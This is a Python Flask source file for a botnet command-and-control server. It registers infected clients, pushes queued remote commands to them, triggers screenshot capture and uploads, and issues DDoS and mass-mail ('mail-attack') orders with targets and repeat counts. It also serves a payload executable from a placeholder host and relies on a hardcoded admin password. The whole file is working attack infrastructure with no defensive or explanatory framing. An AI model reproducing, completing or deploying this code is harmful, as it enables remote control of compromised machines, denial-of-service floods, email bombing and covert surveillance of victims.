from flask import *
import json
import os
import time

version = 1
python_full = "http://YOUR_SERVER_HOST:YOUR_SERVER_PORT/static/RBSI.exe"
go_install = ""
python_with_go = ""
go_full = ""

thisDir = os.path.dirname(os.path.abspath(__file__))
app = Flask(__name__)
app.secret_key = "RBSI"
password = app.secret_key
connects = {}
not_connect = {}
commands = []
mail_attack = {"set-time": time.time()}
ddos = {"set-time": time.time()}
screenshot = 0
stop = {"once": [], "forever": []}
show_version = []
messages = {}


def get_another_name():
    names = {}
    for root, dirs, files in os.walk(thisDir + "/names", topdown=False):
        for name in files:
            with open(os.path.join(root, name), "r", encoding="utf-8") as f:
                names[name] = f.read()
    return names


def format_time():
    return time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())


@app.route("/", methods=["POST", "GET"])
def index():
    global connects, not_connect
    if request.method == "POST" and request.form.get("password") == password:
        session["admin"] = "admin"
    if not session.get("admin"):
        return render_template("login.html")
    count = 0
    _connects = {}
    for i, j in connects.items():
        if time.time() - j <= 15:
            count += 1
        if time.time() - j <= 60:
            _connects[i] = j
        else:
            not_connect[i] = j
    connects = _connects
    return render_template("index.html", connects=connects, not_connect=not_connect,
                           another_name=get_another_name(), count=count,
                           version=version, download_address=python_full,
                           time=time.time, round=round)


@app.route("/upload", methods=["POST"])
def upload():
    f = request.files["file"]
    upload_path = "%s/static/%s.jpg" % (thisDir, request.form["name"])
    f.save(upload_path)
    return "OK"


@app.route("/init", methods=["POST"])
def start():
    if not_connect.get(request.form["name"]):
        del (not_connect[request.form["name"]])
    connects[request.form["name"]] = time.time()
    if not messages.get(request.form["name"]):
        messages[request.form["name"]] = []
    print("新的设备（%s）成功连接到服务器" % request.form["name"])
    result = {"action": len(commands), "version": version, "download_address": python_full}
    return json.dumps(result)


@app.route("/set-another-name", methods=["POST"])
def set_another_name():
    name = request.form["name"].replace("\t", "")
    with open("%s/names/%s" % (thisDir, name), "w", encoding="utf-8") as f:
        f.write(request.form.get("another_name"))
    return redirect("/")


@app.route("/message", methods=["GET", "POST"])
def message():
    if request.method == "POST":
        messages[request.form["name"]] = [format_time() + "&emsp;&emsp;" + request.form.get("message")] + messages[
            request.form["name"]]
        messages[request.form["name"]] = messages[request.form["name"]][:50]
        return "Success"
    else:
        m = "</p><p>".join(messages[request.values.get("name")])
        return "<p>" + m + "</p>"


@app.route("/connect", methods=["POST"])
def connect():
    result = {"getScreen": connects[request.form["name"]] < screenshot}

    if request.form["name"] in show_version:
        result["show-version"] = True
        show_version.remove(request.form["name"])

    if request.form["name"] in stop["once"]:
        result["stop-once"] = True
        stop["once"].remove(request.form["name"])
    if request.form["name"] in stop["forever"]:
        result["stop-forever"] = True

    if len(commands) > int(request.form.get("action")):
        result["actions"] = commands[int(request.form.get("action")):]
    else:
        result["actions"] = None
    result["action"] = len(commands)

    if mail_attack["set-time"] > connects[request.form["name"]]:
        result["mail-attack"] = mail_attack
        result["mail-attack"]["do"] = True
    else:
        result["mail-attack"] = {"do": False}

    if ddos["set-time"] > connects[request.form["name"]]:
        result["DDOS"] = ddos
        result["DDOS"]["do"] = True
    else:
        result["DDOS"] = {"do": False}

    connects[request.form["name"]] = time.time()

    return json.dumps(result)


@app.route("/action", methods=["POST"])
def sub_action():
    if not session.get("admin"):
        return redirect("/")
    commands.append({"command": request.form.get("command"),
                     "send_to": request.form.get("send_to").replace("\t", "").split(";")
                     if request.form.get("send_to") else ["all"]})
    return redirect("/")


@app.route("/ddos", methods=["POST"])
def sub_ddos():
    if not session.get("admin"):
        return redirect("/")
    global ddos
    ddos = request.form.to_dict().copy()
    ddos["times"] = int(ddos["times"])
    ddos["port"] = int(ddos["port"])
    ddos["set-time"] = time.time()
    return redirect("/")


@app.route("/mail-attack", methods=["POST"])
def sub_mail_attack():
    if not session.get("admin"):
        return redirect("/")
    global mail_attack
    mail_attack = request.form.to_dict().copy()
    mail_attack["times"] = int(mail_attack["times"])
    mail_attack["set-time"] = time.time()
    if request.form.get("title") or request.form.get("content") or \
            request.form.get("from-name"):
        mail_attack["easy"] = False
    else:
        mail_attack["easy"] = True
    return redirect("/")


@app.route("/stop-once", methods=["GET", "POST"])
def sub_stop_once():
    if not session.get("admin"):
        return redirect("/?stop-once-False")
    global stop
    if request.values.get("name"):
        for i in request.values.get("name").split(";"):
            stop["once"].append(i.replace("\t", ""))
    return redirect("/")


@app.route("/stop-forever", methods=["POST"])
def sub_stop_forever():
    if not session.get("admin"):
        return redirect("/?stop-forever=False")
    global stop
    if request.form["name"]:
        for i in request.form["name"].split(";"):
            stop["forever"].append(i.replace("\t", ""))
    if request.form.get("reopen"):
        for i in request.form["reopen"].split(";"):
            try:
                stop["forever"].remove(i.replace("\t", ""))
            except:
                pass
    return redirect("/")


@app.route("/show-version", methods=["GET", "POST"])
def sub_show_version():
    if not session.get("admin"):
        return redirect("/")
    global show_version
    if request.values.get("name"):
        for i in request.values.get("name").split(";"):
            show_version.append(i.replace("\t", ""))
    return redirect("/")


@app.route("/d")
def get_download():
    return redirect(python_full)


if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=5001)
